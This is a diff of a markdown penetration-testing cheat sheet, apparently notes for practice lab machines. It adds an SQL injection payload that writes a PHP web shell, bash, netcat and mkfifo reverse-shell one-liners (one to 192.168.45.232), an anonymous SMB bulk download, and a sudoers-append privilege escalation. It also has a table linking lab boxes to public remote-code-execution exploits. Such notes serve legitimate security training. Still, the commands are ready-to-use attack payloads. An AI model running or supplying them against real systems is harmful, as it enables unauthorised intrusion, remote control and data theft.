@@ -70,6 +70,12 @@ Finding columns with a useful data type
 ```
 ' union select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/shell.php' -- -
 ```
+
+#### sqlcli
+```
+mysql -u openemr -p -h 192.168.132.145 --ssl=0
+```
+
 ### Scaning & Enumeration
 
 #### [Nmap](https://nmap.org/)
@@ -89,6 +95,8 @@ smbclient -L DOMAIN --user USER
 
 smbclient -L //10.211.11.10 -N
 smbclient //10.211.11.10/SharedFiles -N
+
+smb:> mget *
 ```
 
 #### [Nikto](https://github.com/sullo/nikto)
@@ -201,6 +209,9 @@ bash -c "bash -i >& /dev/tcp/$KaliIP/4444 0>&1
 ```
 ```
 nc $kaliIP 80 -e /bin/sh
+```
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.232 3306 >/tmp/f
 ```
 #### perl
 ```
@@ -358,7 +369,9 @@ The most commonly used tools
 
 |Lab| Difficulty| Recon| Foothold| Privilege Escalation|
 | -- | -- | -- | -- | -- |
+|Apex|Hard||[Responsive FileManager 9.13.4 - 'path' Path Traversal](https://www.exploit-db.com/exploits/49359), [OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49998)|find password
 |Astronaut|Easy||[GravCMS Unauthenticated Arbitrary YAML Write/Update RCE - CVE-2021-21425](https://github.com/CsEnox/CVE-2021-21425)| `PHP`(SUID)|
+|BitForge|Hard|DirBuster, git-dumper|[SO Planning](https://github.com/Worteks/soplanning/blob/master/includes/demo_data.inc), [CVE-2024-27115-Exploit](https://github.com/theexploiters/CVE-2024-27115-Exploit)|pspy, `sudo -l`
 |Blackgate|Intermediate|Redis|[Redis 4.x/5.x RCE](https://github.com/Ridter/redis-rce), [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server) ||
 |Bratarina|Easy| OpenSMTPD|[OpenSMTPD 6.6.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47984)||
 |Bullybox|Intermediate|[git-dumper](https://github.com/arthaud/git-dumper#git-dumper) | [BoxBilling<=4.22.1.5 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51108)|`sudo`|
@@ -382,6 +395,7 @@ The most commonly used tools
 |Nibbles|Intermediate|PostgreSQL|[PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50847)|`find` (SUID)|
 |Nukem|Hard||[WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload](https://www.exploit-db.com/exploits/48979)|manually examining, `dosbox` (SUID)|
 |Ochima|Intermediate||[Maltrail v0.53 Unauthenticated OS Command Injection (RCE)](https://github.com/spookier/Maltrail-v0.53-Exploit)|`echo 'echo "snort ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> etc_Backup.s`|
+|Payday|Intermediate||[CS-Cart 1.3.3 - authenticated RCE](https://www.exploit-db.com/exploits/48891)|default password|
 |PC|Intermediate|||[rpc.py 0.6.0 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50983)|
 |Pebbles|Easy|DirBuster|!!! not finish 
 |Pelican|Intermediate||[Exhibitor Web UI 1.7.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48654)|`gcore` (SUID)|
@@ -398,9 +412,9 @@ The most commonly used tools
 |Walla|Intermediate|default creds|[RaspAP 2.5 RCE - CVE-2020-24572](https://github.com/gerbsec/CVE-2020-24572-POC)|`sudo -l`, replace python file|
 |WallpaperHub|Hard||LFI|CVE-2024-51757
 |Wombo|Intermediate|Redis|[Redis 4.x/5.x RCE](https://github.com/Ridter/redis-rce), [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)||
+|Zab|Hard|||MySql, hashcat, ligolo-ng, zabbix commnad shell, `rsync` (Sudo)|
 |ZenPhoto|Intermediate|DirBuster|[ZenPhoto 1.4.1.4 RCE - CVE-2011-4825](https://www.exploit-db.com/exploits/18083)|[rds - CVE-2010-3904](https://github.com/SecWiki/linux-kernel-exploits/tree/master/2010/CVE-2010-3904)|
 
-- [ ] [Apex]()
 - [ ] [BitForge]()
 - [ ] [Boolean]()
 - [ ] [Clue]()
@@ -408,9 +422,8 @@ The most commonly used tools
 - [ ] [Hunit]()
 - [ ] [Mantis]()
 - [ ] [Marketing]()
-- [ ] [Payday]()
 - [ ] [Pebbles]()
-- [ ] [Postfish]()
+- [ ] [Postfish]() 
 - [ ] [Readys]()
 - [ ] [Roquefort]()
 - [ ] [Scrutiny]()
@@ -418,7 +431,6 @@ The most commonly used tools
 - [ ] [Sybaris]()
 - [ ] [Vmdak]()
 - [ ] [Xposedapi]()
-- [ ] [Zab]()
 - [ ] [Zipper]()
 
 #### Windows Box
